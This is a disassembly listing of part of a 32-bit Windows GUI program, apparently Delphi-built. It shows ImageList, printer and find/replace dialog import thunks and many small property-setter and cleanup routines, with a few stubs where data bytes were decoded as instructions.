jmp [ __import_lookup_table_14(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_14(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ __import_lookup_table_14(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_14(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_14(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_14(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_14(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_429a70
push ecx
push edx
push 0x1212
push eax
call SendMessageA
retn
sub_429aa5
jmp sub_4039ec
sub_429aac
pop ebp
retn
sub_429ab0
sub [ rw-data ] 0x1
retn
sub_429b77
jmp sub_4039ec
sub_429b7e
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a194
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_429ba0
mov [ rw-data ] sub_429cb8
mov [ rw-data ] sub_429c28
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_429ebc
mov [ rw-data ] sub_429f90
mov [ rw-data ] sub_42a064
retn
sub_42a225
jmp sub_4039ec
sub_42a22c
pop ebp
retn
sub_42a230
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42a194
sub_42a265
jmp sub_4039ec
sub_42a26c
pop ebp
retn
sub_42a270
sub [ rw-data ] 0x1
retn
sub_42a6b2
jmp sub_4039ec
sub_42a6b9
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a8c9
jmp sub_4039ec
sub_42a8d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42aa85
jmp sub_4039ec
sub_42aaea
jmp sub_4039ec
sub_42aaf1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42abdd
jmp sub_4039ec
sub_42abe4
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42adf4
lea eax [ ebp - 0x30 ]
call sub_403fe8
lea eax [ ebp - 0x20 ]
call sub_403fe8
retn
sub_42ae05
jmp sub_4039ec
j_sub_42adf4
jmp sub_42adf4
sub_42ae0c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42af07
jmp sub_4039ec
sub_42af0e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b00b
jmp sub_4039ec
sub_42b012
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b072
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
sub_42b07b
jmp sub_4039ec
j_sub_42b072
jmp sub_42b072
sub_42b082
pop ebx
pop ecx
pop ebp
retn
sub_42b11d
jmp sub_4039ec
sub_42b124
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42b130
mov eax [ eax + 0x20 ]
retn
sub_42b25f
jmp sub_4039ec
sub_42b266
pop ebp
retn
sub_42b268
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_15(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_42b2b5
jmp sub_4039ec
sub_42b2bc
pop ebp
retn
sub_42b2c0
sub [ rw-data ] 0x1
retn
sub_42b56f
jmp sub_4039ec
sub_42b576
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42b756
jmp sub_4039ec
sub_42b75d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b7c9
jmp sub_4039ec
sub_42b7d0
pop ecx
pop ecx
pop ebp
retn
sub_42bae7
jmp sub_4039ec
sub_42baee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42baf8
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_42bd50
sub_42bceb
jmp sub_4039ec
sub_42bcfc
jmp sub_403738
sub_42bd3f
jmp sub_4039ec
sub_42bd46
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42beed
jmp sub_4039ec
sub_42bf2d
jmp sub_4039ec
sub_42bf34
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bf8c
add eax 0x8
call sub_40cf90
retn
sub_42bf98
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b580
mov [ rw-data ] eax
sub_42bfe9
jmp sub_4039ec
sub_42bff0
pop ebp
retn
sub_42bff4
sub [ rw-data ] 0x1
retn
sub_42c301
jmp sub_4039ec
sub_42c308
pop ebp
retn
sub_42c30c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c058
sub_42c36a
inc edx
add ah ch
retn
sub_42c3ec
retn
sub_42c460
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42c46c
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42c478
mov edx [ eax ]
call [ edx ]
retn
sub_42c480
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42c4ad
jmp sub_4039ec
sub_42c4b4
pop ebp
retn
sub_42c4b8
sub [ rw-data ] 0x1
retn
sub_42c677
jmp sub_4039ec
sub_42c67e
pop ebp
retn
sub_42ca33
jmp sub_4039ec
sub_42ca3a
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42ce54
jmp sub_4039ec
sub_42ce5b
pop ebp
retn
sub_42ce60
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c3f0
mov [ rw-data ] eax
sub_42cea1
jmp sub_4039ec
sub_42cea8
pop ebp
retn
sub_42ceac
sub [ rw-data ] 0x1
retn
sub_42ced9
jmp sub_4039ec
sub_42cee0
pop ebp
retn
sub_42cee4
sub [ rw-data ] 0x1
retn
sub_42cf11
jmp sub_4039ec
sub_42cf18
pop ebp
retn
sub_42cf1c
sub [ rw-data ] 0x1
retn
sub_42cf49
jmp sub_4039ec
sub_42cf50
pop ebp
retn
sub_42cf54
sub [ rw-data ] 0x1
retn
sub_42cf81
jmp sub_4039ec
sub_42cf88
pop ebp
retn
sub_42cf8c
sub [ rw-data ] 0x1
retn
sub_42cfb9
jmp sub_4039ec
sub_42cfc0
pop ebp
retn
sub_42cfc4
sub [ rw-data ] 0x1
retn
sub_42cff1
jmp sub_4039ec
sub_42cff8
pop ebp
retn
sub_42cffc
sub [ rw-data ] 0x1
retn
FindTextA
jmp [ __import_lookup_table_16(comdlg32:FindTextA) ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
sub_42d041
jmp sub_4039ec
sub_42d048
pop ebp
retn
sub_42d04c
sub [ rw-data ] 0x1
retn
sub_42d079
jmp sub_4039ec
sub_42d080
pop ebp
retn
sub_42d084
sub [ rw-data ] 0x1
retn
sub_42ddaa
jmp sub_403738
sub_42ddaf
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466fa8
call sub_403aa0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ddcc
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42ddd4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_40346c
pop esi
retn
sub_42ddec
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_40346c
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42de04
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42dead
jmp sub_4039ec
sub_42dedb
jmp sub_4039ec
sub_42dee2
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42deec
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42df00
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42e008
jmp sub_4039ec
sub_42e084
jmp sub_4039ec
sub_42e08b
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42e116
jmp sub_4039ec
sub_42e193
jmp sub_4039ec
sub_42e19a
pop ecx
pop ebp
retn 0x8
sub_42e58c
jmp sub_403738
sub_42e806
inc esp
add ah dl
iretd
sub_42e8b4
call sub_403270
retn
sub_42ec3c
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_42ec50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_404258
pop esi
pop ebx
retn
sub_42ec6c
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42ec84
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42ecb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_404258
pop esi
pop ebx
retn
sub_42ecd4
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42ec84
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_42edce
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_42f0b6
jmp sub_4039ec
sub_42f0bd
pop ebp
retn
sub_42f5e6
inc esp
add ah dl
iretd
sub_42f762
inc esp
add ah dl
iretd
sub_4304d8
push esi
mov esi eax
cmp dl [ esi + 0x168 ]
je r-xdata
pop esi
retn
mov [ esi + 0x168 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4304f4
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43098a
jmp sub_403738
sub_430a43
jmp sub_4039ec
sub_430a4a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430a50
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4309c4
sub_430a60
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_4309c4
sub_430a70
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_4309c4
pop ebp
retn 0x8
sub_430a88
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_430bb4
push ebx
mov ebx eax
mov eax ebx
call sub_44c62c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_430bc8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_430bfc
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_430d00
jmp sub_4039ec
sub_430d07
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430eaa
jmp sub_4039ec
sub_430eb1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430ebb
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_430ed0
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_449914
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_430eec
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_449914
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_430f08
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_449914
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_430f24
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_449914
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_430f40
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_44a5f4
sub_430f54
mov al [ eax + 0x220 ]
retn
sub_4310bd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_4310d5
jmp sub_4039ec
sub_431883
jmp sub_4039ec
sub_4318f0
jmp sub_4039ec
sub_431a0c
push ebx
lea ebx [ eax + 0x190 ]
push ebx
lea ebx [ eax + 0x1ac ]
push ebx
call sub_431938
pop ebx
retn
sub_431b58
mov [ eax + 0x16d ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_431f08
jmp sub_4039ec
sub_431f0f
pop ebp
retn
sub_431f14
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d70
mov eax [ r-xdata ]
call sub_417b84
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
sub_431f71
jmp sub_4039ec
sub_431f78
pop ebp
retn
sub_431f7c
sub [ rw-data ] 0x1
retn
sub_431fb5
jmp sub_4039ec
sub_431fbc
pop ebp
retn
sub_431fc0
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_43203c
retn
sub_43203d
jmp sub_4039ec
j_sub_43203c
jmp sub_43203c
sub_432044
pop ebp
retn
sub_432048
sub [ rw-data ] 0x1
retn
sub_432050
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403270
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_432114
jmp sub_4039ec
sub_43211b
pop ebp
retn
sub_432120
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_43206c
call sub_403dbc
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402c84
sub_43216d
jmp sub_4039ec
sub_432174
pop ebp
retn
sub_432178
sub [ rw-data ] 0x1
retn
sub_4321d4
jmp sub_4039ec
sub_4321db
pop ebp
retn
sub_4321e0
sub [ rw-data ] 0x1
retn
sub_43223c
jmp sub_4039ec
sub_432243
pop ebp
retn
sub_432248
sub [ rw-data ] 0x1
retn
sub_4322a9
jmp sub_4039ec
sub_4322b0
pop ebp
retn
sub_4322b4
sub [ rw-data ] 0x1
retn
sub_432300
jmp sub_4039ec
sub_432307
pop ebp
retn
sub_43230c
sub [ rw-data ] 0x1
retn
sub_432339
jmp sub_4039ec
sub_432340
pop ebp
retn
sub_432344
sub [ rw-data ] 0x1
retn
sub_43279a
inc esp
add ah dl
iretd
sub_4329c6
inc esp
add ah dl
iretd
sub_433736
inc esp
add ah dl
iretd
sub_43373a
inc esp
add [ eax - 0xfffbc7a ] bh
xchg [ ebx ] al
and al 0x84
inc ebx
add [ 0x2bb03c00 ] cl
mov esp 0x201bc4e
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
sub_433daa
inc esp
add ah dl
iretd
sub_43459e
inc esp
add ah dl
iretd
sub_434f6a
inc esp
add ah dl
iretd
sub_4350e2
inc esp
add ah dl
iretd
sub_435716
inc esp
add ah dl
iretd
sub_43586a
inc esp
add ah dl
iretd
sub_435d82
inc esp
add ah dl
iretd
sub_43617c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d05c
mov [ rw-data ] eax
cmp [ rw-data ] 0x20
ja r-xdata
xor eax eax
mov [ rw-data ] eax
sub_4362a4
cmp dl [ eax + 0x16 ]
je r-xdata
retn
mov [ eax + 0x16 ] dl
mov [ eax + 0x17 ] 0x0
xor edx edx
call sub_418f0c
sub_4362b8
mov al [ eax + 0x17 ]
xor al 0x1
retn
sub_4362c0
cmp dl [ eax + 0x17 ]
je r-xdata
retn
mov [ eax + 0x17 ] dl
call sub_4362d0
sub_436308
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x16 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43635c
cmp dl [ eax + 0x14 ]
je r-xdata
retn
mov [ eax + 0x14 ] dl
xor edx edx
call sub_418f0c
sub_43636c
cmp dl [ eax + 0x15 ]
je r-xdata
retn
mov [ eax + 0x15 ] dl
xor edx edx
call sub_418f0c
sub_43637c
cmp dl [ eax + 0x18 ]
je r-xdata
retn
mov [ eax + 0x18 ] dl
xor edx edx
call sub_418f0c
sub_436424
push ebx
mov ebx eax
mov eax ebx
call sub_419120
pop ebx
retn
sub_436444
mov eax [ eax + 0x18 ]
retn
sub_4366cc
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4369e2
jmp sub_4039ec
sub_436a48
cmp dl [ eax + 0x215 ]
je r-xdata
retn
mov [ eax + 0x215 ] dl
mov dl 0x1
call sub_437038
sub_436bf0
jmp sub_4039ec
sub_436bf7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436e4e
jmp sub_4039ec
sub_436e55
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_436e64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x210 ]
call sub_4042a8
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_436ec0
cmp [ eax + 0x217 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x59 ] 0x0
jne r-xdata
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_436f0c
push ebx
mov ebx eax
mov eax ebx
call sub_44c588
mov eax ebx
call sub_44a5f4
pop ebx
retn
sub_436f20
push ebx
mov ebx eax
mov eax ebx
call sub_448428
cmp [ ebx + 0x217 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x59 ] 0x0
je r-xdata
mov [ ebx + 0x217 ] 0x0
sub_436fbc
push ebx
mov ebx eax
mov eax ebx
call sub_44c6ec
mov eax ebx
call sub_44a5f4
pop ebx
retn
sub_436fd0
push ebx
mov ebx eax
mov eax ebx
call sub_44c77c
mov eax ebx
call sub_436a60
pop ebx
retn
sub_436fe4
push ebx
mov ebx ecx
cmp [ eax + 0x217 ] 0x0
je r-xdata
mov ecx ebx
call sub_44cb60
pop ebx
retn
mov cl [ r-xdata ]
mov [ eax + 0x98 ] cl
sub_437030
call sub_446638
retn
sub_437100
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4363c4
retn
sub_437110
mov eax [ r-xdata ]
retn
sub_43724c
cmp dl [ eax + 0x24 ]
je r-xdata
retn
mov [ eax + 0x24 ] dl
mov [ eax + 0x25 ] 0x0
xor edx edx
call sub_418f0c
sub_437260
mov al [ eax + 0x25 ]
xor al 0x1
retn
sub_437268
cmp dl [ eax + 0x25 ]
je r-xdata
retn
mov [ eax + 0x25 ] dl
call sub_437278
sub_4372b0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4372c8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x1
je r-xdata
mov al 0x1
retn
sub_437304
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
xor edx edx
call sub_418f0c
sub_437334
mov ecx [ eax + 0x14 ]
cmp edx ecx
jge r-xdata
cmp edx 0x2710
jle r-xdata
mov edx ecx
mov [ eax + 0x18 ] edx
mov edx [ eax + 0x10 ]
call sub_4373ac
retn
mov edx 0x2710
sub_437358
test edx edx
jge r-xdata
mov ecx [ eax + 0x18 ]
cmp edx ecx
jle r-xdata
xor edx edx
mov [ eax + 0x14 ] edx
mov edx [ eax + 0x10 ]
call sub_4373ac
retn
mov edx ecx
sub_437374
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
xor edx edx
call sub_418f0c
sub_4373f4
cmp edx [ eax + 0x20 ]
je r-xdata
retn
mov [ eax + 0x20 ] edx
xor edx edx
call sub_418f0c
sub_437448
or ecx 0xffffffff
xor edx edx
call sub_437498
retn
sub_437468
mov eax [ eax + 0x18 ]
retn
sub_437710
jmp sub_4039ec
sub_437832
jmp sub_4039ec
sub_437839
mov eax [ ebp - 0x4 ]
call sub_44a3f0
pop ecx
pop ecx
pop ebp
retn
sub_4379ee
jmp sub_4039ec
sub_437a8c
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_437aac
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_437af8
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_44a5f4
sub_437b0c
cmp dl [ eax + 0x221 ]
je r-xdata
retn
mov [ eax + 0x221 ] dl
call sub_44a5f4
sub_437b20
cmp dl [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] dl
call sub_44a5f4
sub_437b34
cmp dl [ eax + 0x222 ]
je r-xdata
retn
mov [ eax + 0x222 ] dl
call sub_44a5f4
sub_437b48
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_437df5
jmp sub_4039ec
sub_437dfc
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_437fa2
jmp sub_4039ec
sub_4380ce
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43838e
jmp sub_4039ec
sub_4383ab
jmp sub_4039ec
sub_4383bc
push ebx
mov ebx eax
mov eax ebx
call sub_44b530
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43860c
jmp sub_4039ec
sub_438613
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438636
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4051fc
retn
sub_43862f
jmp sub_4039ec
sub_438636
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438698
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_4386f0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_437404
retn
sub_43896c
call sub_44a3f0
retn
sub_438bee
jmp sub_4039ec
sub_438bf5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_438c00
mov ecx [ eax + 0x220 ]
push ecx
mov ecx [ eax + 0x21c ]
call sub_438a78
retn
sub_438c14
mov ecx [ eax + 0x220 ]
cmp edx ecx
jg r-xdata
retn
push ecx
mov ecx [ eax + 0x228 ]
xchg edx ecx
call sub_438a78
sub_438c30
mov ecx [ eax + 0x21c ]
cmp edx ecx
jl r-xdata
retn
push edx
mov edx [ eax + 0x228 ]
call sub_438a78
sub_438c84
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_44a5f4
sub_438c98
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44a5f4
sub_438d5c
cmp dl [ eax + 0x218 ]
je r-xdata
retn
mov [ eax + 0x218 ] dl
call sub_44a5f4
sub_438dd4
cmp edx [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] edx
call sub_438d70
sub_438de8
cmp edx [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] edx
call sub_438d70
sub_438dfc
push ebx
cmp [ eax + 0x23a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x23c ]
call [ ebx + 0x238 ]
sub_43907c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_439090
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_4393bc
push esi
mov [ eax + 0x218 ] dx
mov [ eax + 0x21a ] cx
mov si 0xffb3
call sub_40346c
pop esi
retn
sub_439478
cmp [ eax + 0x228 ] 0x1
jne r-xdata
mov dl 0x1
call sub_439a40
retn
xor edx edx
call sub_439a40
retn
sub_4394cc
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_4396fa
jmp sub_4039ec
sub_439701
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4399bc
jmp sub_4039ec
sub_4399c3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439c64
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_439db4
sub_43a1b8
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44c2f8
retn
mov [ edx + 0xc ] 0x1
retn
sub_43a2c3
jmp sub_4039ec
sub_43a2d8
call sub_44b640
retn
sub_43a394
push ebx
mov ebx eax
mov eax ebx
call sub_44c588
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44a5f4
sub_43a3fc
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_43a41c
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_43a43c
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_43a45c
push ebx
mov ebx eax
cmp [ ebx + 0x25a ] 0x0
je r-xdata
mov [ ebx + 0x208 ] 0x0
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_43a480
push ebx
mov ebx eax
mov eax ebx
call sub_448814
cmp [ ebx + 0x234 ] 0x0
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43a6f4
sub_43a6e6
jmp sub_4039ec
sub_43a6ed
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a734
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44a5f4
sub_43a888
jmp sub_403738
sub_43a8c6
jmp sub_4039ec
sub_43a8cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a914
cmp edx [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] edx
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_43ab6c
sub_43a960
cmp dx [ eax + 0x23a ]
je r-xdata
retn
mov [ eax + 0x23a ] dx
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_43ab6c
sub_43a97c
cmp dl [ eax + 0x235 ]
je r-xdata
retn
mov [ eax + 0x235 ] dl
call sub_44a5f4
sub_43a990
cmp dl [ eax + 0x236 ]
je r-xdata
retn
mov [ eax + 0x236 ] dl
call sub_44a5f4
sub_43ab18
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43a8d4
mov dx 0x1
mov eax ebx
call sub_43ab38
